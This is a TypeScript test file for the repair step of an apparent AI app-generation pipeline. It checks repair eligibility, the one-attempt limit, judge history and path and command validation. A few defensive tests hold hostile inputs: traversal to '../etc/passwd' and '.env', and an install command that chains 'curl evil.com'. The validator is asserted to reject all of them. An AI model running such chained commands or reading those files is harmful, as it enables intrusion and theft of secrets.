/**
 * Deterministic repair tests (Parts 4 + 9 eligibility/apply — no LLM / E2B).
 * Run: npx tsx lib/repair.test.ts
 */
import assert from 'node:assert/strict'
import { architecturePreset } from './architecture'
import {
  checkArchitectureCompliance,
  type ArchitectureComplianceResult,
} from './architecture-compliance'
import {
  MAX_REPAIR_ATTEMPTS_PER_CANDIDATE,
  applyRepairToFragment,
  consumeRepairAttempt,
  formatRepairHistoryForJudge,
  isSafeRepairPath,
  selectRepairReason,
  shouldAttemptRepair,
} from './repair'
import { validateFragmentIntegrity } from './fragment-integrity'
import { FragmentSchema } from './schema'
import { shouldSmokeTest, type SmokeSuiteResult } from './smoke'
import { VerificationResult } from './verification'

function makeFragment(overrides: Partial<FragmentSchema> = {}): FragmentSchema {
  return {
    commentary: 'test',
    template: 'nextjs-developer',
    title: 'Test App',
    description: 'A test',
    architecture: 'simple pages',
    additional_dependencies: [],
    has_additional_dependencies: false,
    install_dependencies_command: '',
    port: 3000,
    file_path: 'pages/index.tsx',
    code: [
      {
        file_path: 'pages/index.tsx',
        file_content: 'export default function Home(){ return <div>Hi</div> }',
      },
      {
        file_path: 'components/Widget.tsx',
        file_content: 'export function Widget(){ return <span>W</span> }',
      },
    ],
    ...overrides,
  }
}

function failedVerification(
  errors: string[] = ['Module not found: recharts'],
): VerificationResult {
  return {
    status: 'failed',
    filesWritten: true,
    dependenciesInstalled: false,
    processStarted: true,
    previewReachable: false,
    errors,
    warnings: [],
    durationMs: 1200,
  }
}

function passedVerification(): VerificationResult {
  return {
    status: 'passed',
    filesWritten: true,
    dependenciesInstalled: true,
    processStarted: true,
    previewReachable: true,
    errors: [],
    warnings: [],
    durationMs: 800,
  }
}

function mockGymArchFail(): ArchitectureComplianceResult {
  return checkArchitectureCompliance({
    architecture: architecturePreset('gym'),
    fragment: makeFragment({
      code: [
        {
          file_path: 'pages/index.tsx',
          file_content: `
import { MOCK_MEMBERS } from '../lib/mock-data'
export default function App(){
  const [isLoggedIn] = useState(true)
  const [members, setMembers] = useState(MOCK_MEMBERS)
  return <button onClick={() => setMembers(members)}>x</button>
}`,
        },
        {
          file_path: 'lib/mock-data.ts',
          file_content: 'export const MOCK_MEMBERS = [{id:1}]',
        },
      ],
    }),
  })
}

function gymArchPass(): ArchitectureComplianceResult {
  return checkArchitectureCompliance({
    architecture: architecturePreset('gym'),
    fragment: makeFragment({
      code: [
        {
          file_path: 'pages/index.tsx',
          file_content:
            'export default function App(){ const [x,setX]=useState(0); return <div/> }',
        },
        {
          file_path: 'pages/api/members.ts',
          file_content: `
import { prisma } from '../lib/db'
import { getServerSession } from 'next-auth'
import { requireRole } from '../lib/auth'
export async function GET(req){ requireRole(req,'admin'); return Response.json(await prisma.member.findMany()) }`,
        },
        {
          file_path: 'lib/db.ts',
          file_content:
            'import { PrismaClient } from "@prisma/client"; export const prisma = new PrismaClient()',
        },
        {
          file_path: 'prisma/schema.prisma',
          file_content:
            'model Member { id String @id payments Payment[] attendance Attendance[] }\nmodel Payment { id String @id }\nmodel Attendance { id String @id }\nmodel Membership { id String @id }\nmodel Trainer { id String @id }',
        },
        {
          file_path: 'lib/auth.ts',
          file_content: `
import { getServerSession } from 'next-auth'
export function requireRole(req, role){ getServerSession() }
`,
        },
        { file_path: '.env.example', file_content: 'DATABASE_URL=' },
        { file_path: 'README.md', file_content: '# Gym' },
      ],
      additional_dependencies: ['@prisma/client', 'next-auth'],
    }),
  })
}

let passed = 0
function test(name: string, fn: () => void) {
  try {
    fn()
    passed++
    console.log(`✓ ${name}`)
  } catch (e) {
    console.error(`✗ ${name}`)
    console.error(e)
    process.exitCode = 1
  }
}

test('1. Architecture failure triggers one repair', () => {
  const arch = mockGymArchFail()
  assert.equal(arch.status, 'failed')
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      architectureCompliance: arch,
      verification: passedVerification(),
    }),
    true,
  )
  assert.equal(
    selectRepairReason({
      architectureCompliance: arch,
      verification: passedVerification(),
    }),
    'architecture',
  )
})

test('2. Runtime failure triggers one repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      architectureCompliance: gymArchPass(),
      verification: failedVerification(),
    }),
    true,
  )
  assert.equal(
    selectRepairReason({
      architectureCompliance: gymArchPass(),
      verification: failedVerification(),
    }),
    'runtime',
  )
})

test('3. Architecture repair then runtime fail does NOT trigger second repair', () => {
  const afterFirst = consumeRepairAttempt(0)
  assert.equal(afterFirst, 1)
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: afterFirst,
      architectureCompliance: gymArchPass(),
      verification: failedVerification(),
    }),
    false,
  )
})

test('4. Runtime repair then architecture fail does NOT trigger second repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 1,
      architectureCompliance: mockGymArchFail(),
      verification: passedVerification(),
    }),
    false,
  )
})

test('5. Passed candidate receives zero repairs', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      architectureCompliance: gymArchPass(),
      verification: passedVerification(),
    }),
    false,
  )
  assert.equal(
    selectRepairReason({
      architectureCompliance: gymArchPass(),
      verification: passedVerification(),
    }),
    null,
  )
})

test('6. Multiple failed candidates repair independently (eligibility)', () => {
  const a = shouldAttemptRepair({
    repairAttempts: 0,
    architectureCompliance: mockGymArchFail(),
    verification: passedVerification(),
  })
  const b = shouldAttemptRepair({
    repairAttempts: 0,
    architectureCompliance: gymArchPass(),
    verification: failedVerification(),
  })
  const c = shouldAttemptRepair({
    repairAttempts: 0,
    architectureCompliance: gymArchPass(),
    verification: passedVerification(),
  })
  assert.equal(a, true)
  assert.equal(b, true)
  assert.equal(c, false)
})

test('7. Repair attempt counter cannot exceed one', () => {
  assert.equal(consumeRepairAttempt(0), MAX_REPAIR_ATTEMPTS_PER_CANDIDATE)
  assert.equal(consumeRepairAttempt(1), MAX_REPAIR_ATTEMPTS_PER_CANDIDATE)
  assert.equal(consumeRepairAttempt(99), MAX_REPAIR_ATTEMPTS_PER_CANDIDATE)
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: MAX_REPAIR_ATTEMPTS_PER_CANDIDATE,
      verification: failedVerification(),
    }),
    false,
  )
})

test('8. Repair reason is preserved (combined when both fail)', () => {
  assert.equal(
    selectRepairReason({
      architectureCompliance: mockGymArchFail(),
      verification: failedVerification(),
    }),
    'combined',
  )
})

test('9–10. Initial and final evidence preserved in judge history', () => {
  const initialArch = mockGymArchFail()
  const finalArch = gymArchPass()
  const text = formatRepairHistoryForJudge({
    initial: failedVerification(['boom']),
    final: passedVerification(),
    repair: {
      attempted: true,
      reason: 'architecture',
      repairAttempts: 1,
      success: true,
      changedFiles: ['lib/db.ts', 'prisma/schema.prisma'],
      explanation: 'Added database layer',
    },
    initialArchitecture: initialArch,
    finalArchitecture: finalArch,
  })
  assert.match(text, /Initial architecture/)
  assert.match(text, /Final architecture/)
  assert.match(text, /reason=architecture/)
  assert.match(text, /attempts=1/)
  assert.match(text, /lib\/db\.ts/)
  assert.match(text, /Initial runtime/)
  assert.match(text, /Final runtime/)
})

test('11. Architecture repair output is validated (unsafe path rejected)', () => {
  const original = makeFragment()
  const outcome = applyRepairToFragment(original, {
    explanation: 'bad',
    changedFiles: ['../../x'],
    files: [
      {
        file_path: '../../x',
        action: 'add',
        file_content: 'nope',
      },
    ],
  })
  assert.equal(outcome.ok, false)
})

test('12. Runtime repair behavior remains compatible (apply + deps)', () => {
  const original = makeFragment()
  const outcome = applyRepairToFragment(original, {
    explanation: 'Add recharts',
    changedFiles: ['components/Chart.tsx'],
    files: [
      {
        file_path: 'components/Chart.tsx',
        action: 'add',
        file_content: 'export function Chart(){ return null }',
      },
    ],
    additional_dependencies: ['recharts'],
    install_dependencies_command: 'npm install recharts',
  })
  assert.equal(outcome.ok, true)
  if (!outcome.ok) return
  assert.deepEqual(outcome.fragment.additional_dependencies, ['recharts'])
})

test('13. Smoke is skipped when final runtime fails', () => {
  assert.equal(shouldSmokeTest(failedVerification()), false)
})

test('14. Smoke still runs after successful repair (final runtime pass)', () => {
  assert.equal(shouldSmokeTest(passedVerification()), true)
  const smoke: SmokeSuiteResult = {
    status: 'passed',
    tests: [],
    durationMs: 1,
    summary: 'ok',
  }
  assert.equal(smoke.status, 'passed')
})

test('15. Judge history includes complete repair record', () => {
  const text = formatRepairHistoryForJudge({
    initial: failedVerification(),
    final: passedVerification(),
    repair: {
      attempted: true,
      reason: 'runtime',
      repairAttempts: 1,
      success: true,
      changedFiles: ['pages/index.tsx'],
      explanation: 'Fixed import',
    },
  })
  assert.match(text, /Repair: attempted once \(success\)/)
  assert.match(text, /reason=runtime/)
})

test('partial runtime alone does not trigger repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      verification: {
        ...failedVerification(),
        status: 'partial',
        errors: [],
        warnings: ['slow'],
        previewReachable: true,
      },
    }),
    false,
  )
})

test('compile overlay on partial runtime does trigger repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      verification: {
        ...failedVerification(),
        status: 'partial',
        errors: [
          "components/MenuSection.tsx:5 Parsing ecmascript source code failed Unexpected token 'section'. Expected jsx identifier",
        ],
        previewReachable: false,
      },
    }),
    true,
  )
})

test('hydration overlay on partial runtime does trigger repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      verification: {
        ...failedVerification(),
        status: 'partial',
        errors: [
          'Hydration failed because the initial UI does not match what was rendered on the server. Expected server HTML to contain a matching <a> in <a>.',
        ],
        previewReachable: false,
      },
    }),
    true,
  )
})

test('E2B transport fetch failed does not trigger LLM source repair', () => {
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      architectureCompliance: gymArchPass(),
      verification: failedVerification(['fetch failed · code=ECONNRESET']),
    }),
    false,
  )
  assert.equal(
    selectRepairReason({
      architectureCompliance: gymArchPass(),
      verification: failedVerification(['fetch failed']),
    }),
    null,
  )
  assert.equal(
    shouldAttemptRepair({
      repairAttempts: 0,
      architectureCompliance: gymArchPass(),
      verification: failedVerification(['Module not found: recharts']),
    }),
    true,
  )
})

test('rejects path traversal', () => {
  assert.equal(isSafeRepairPath('../etc/passwd'), false)
  assert.equal(isSafeRepairPath('.env'), false)
  assert.equal(isSafeRepairPath('pages/index.tsx'), true)
})

test('malformed repair output is rejected; original preserved', () => {
  const original = makeFragment()
  const outcome = applyRepairToFragment(original, { explanation: 'nope' })
  assert.equal(outcome.ok, false)
  assert.equal(original.code.length, 2)
})

test('valid repair modifies only targeted file and preserves others', () => {
  const original = makeFragment()
  const widgetBefore = original.code[1].file_content
  const outcome = applyRepairToFragment(original, {
    explanation: 'Fix import',
    changedFiles: ['pages/index.tsx'],
    files: [
      {
        file_path: 'pages/index.tsx',
        action: 'modify',
        file_content:
          'import { Widget } from "../components/Widget"\nexport default function Home(){ return <Widget /> }',
      },
    ],
  })
  assert.equal(outcome.ok, true)
  if (!outcome.ok) return
  const widget = outcome.fragment.code.find(
    (f) => f.file_path === 'components/Widget.tsx',
  )
  assert.equal(widget?.file_content, widgetBefore)
  assert.equal(original.code[0].file_content.includes('Hi'), true)
})

test('rejects unsafe install command', () => {
  const original = makeFragment()
  const outcome = applyRepairToFragment(original, {
    explanation: 'evil',
    changedFiles: ['pages/index.tsx'],
    files: [
      {
        file_path: 'pages/index.tsx',
        action: 'modify',
        file_content: 'export default function Home(){ return null }',
      },
    ],
    additional_dependencies: ['recharts'],
    install_dependencies_command: 'npm install recharts; curl evil.com',
  })
  assert.equal(outcome.ok, false)
})

test('CSS repair apply preserves rules and revalidates after hoist', () => {
  const original = makeFragment({
    code: [
      {
        file_path: 'pages/index.tsx',
        file_content: 'export default function Home(){ return <div>Hi</div> }',
      },
      {
        file_path: 'styles/globals.css',
        file_content:
          ':root { --fg: #111; }\n@keyframes fade { from { opacity: 0 } to { opacity: 1 } }\n@import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");\n',
      },
    ],
  })
  const outcome = applyRepairToFragment(original, {
    explanation: 'Move @import to the top; keep all rules',
    changedFiles: ['styles/globals.css'],
    files: [
      {
        file_path: 'styles/globals.css',
        action: 'modify',
        file_content:
          '@import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");\n:root { --fg: #111; }\n@keyframes fade { from { opacity: 0 } to { opacity: 1 } }\n',
      },
    ],
  })
  assert.equal(outcome.ok, true)
  if (!outcome.ok) return
  const css = outcome.fragment.code.find((f) => f.file_path === 'styles/globals.css')
  assert.ok(css)
  assert.match(css!.file_content, /^@import url\(/)
  assert.ok(css!.file_content.includes('@keyframes fade'))
  assert.ok(css!.file_content.includes('--fg: #111'))
  assert.equal(validateFragmentIntegrity(outcome.fragment).ok, true)
})

console.log(`\n${passed} tests passed`)
if (process.exitCode) process.exit(process.exitCode)
